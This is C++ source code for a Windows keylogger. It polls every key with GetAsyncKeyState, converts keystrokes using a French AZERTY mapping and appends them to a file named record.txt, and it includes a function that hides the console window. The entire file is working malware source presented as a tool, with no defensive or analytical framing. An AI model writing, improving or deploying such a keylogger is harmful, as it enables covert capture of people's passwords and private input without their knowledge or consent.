#include <iostream>
#include <conio.h>
#include <windows.h>
#include <winuser.h>
#include <fstream>



using namespace std;

 void Stealth(){
      HWND Stealth;
      AllocConsole();
      Stealth = FindWindowA("ConsoleWindowClass", NULL);
      ShowWindow(Stealth,0);
}


void log()
{
	char key;
	for (;;)
	{
		//sleep(0);
		for (key = 8; key <= 254 ; ++key)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				ofstream write("record.txt", ios::app);
				if ((key>64) && (key<91) && !(GetAsyncKeyState(0x10)))
				{
					key += 32;
					write << key;
					write.close();
					break;
				}
				else if ((key>64) && (key<91))
				{
					write << key;
					write.close();
					break;
				}
				else{
                    switch(key){
                        case 48:{
                            if(GetAsyncKeyState(0x10)){
                                write << "0";
                            }
                            else{
                                write << "à";
                            }
                        }
                        break;
                        case 49:{
                            if(GetAsyncKeyState(0x10)){
                                write << "1";
                            }
                            else{
                                write << "&";
                            }
                        }
                        break;
                        case 50:{
                            if(GetAsyncKeyState(0x10)){
                                write << "2";
                            }
                            else{
                                write << "é";
                            }
                        }
                        break;
                        case 51:{
                            if(GetAsyncKeyState(0x10)){
                                write << "3";
                            }
                            else{
                                write << '"';
                            }
                        }
                        break;
                        case 52:{
                            if(GetAsyncKeyState(0x10)){
                                write << "4";
                            }
                            else{
                                write << "'";
                            }
                        }
                        break;
                        case 53:{
                            if(GetAsyncKeyState(0x10)){
                                write << "5";
                            }
                            else{
                                write << "(";
                            }
                        }
                        break;
                        case 54:{
                            if(GetAsyncKeyState(0x10)){
                                write << "6";
                            }
                            else{
                                write << "-";
                            }
                        }
                        break;
                        case 55:{
                            if(GetAsyncKeyState(0x10)){
                                write << "7";
                            }
                            else{
                                write << "è";
                            }
                        }
                        break;
                        case 56:{
                            if(GetAsyncKeyState(0x10)){
                                write << "8";
                            }
                            else{
                                write << "_";
                            }
                        }
                        break;
                        case 57:{
                            if(GetAsyncKeyState(0x10)){
                                write << "9";
                            }
                            else{
                                write << "ç";
                            }
                        }
                        break;
                        case 219:{
                            if(GetAsyncKeyState(0x10)){

                                write << key;
                            }
                            else{
                                write << "jesaispas";
                            }
                        }
                        break;

                    }
				}
			}
		}
	}
}


int main()
{
	log();
	Stealth();
	return 0;
}
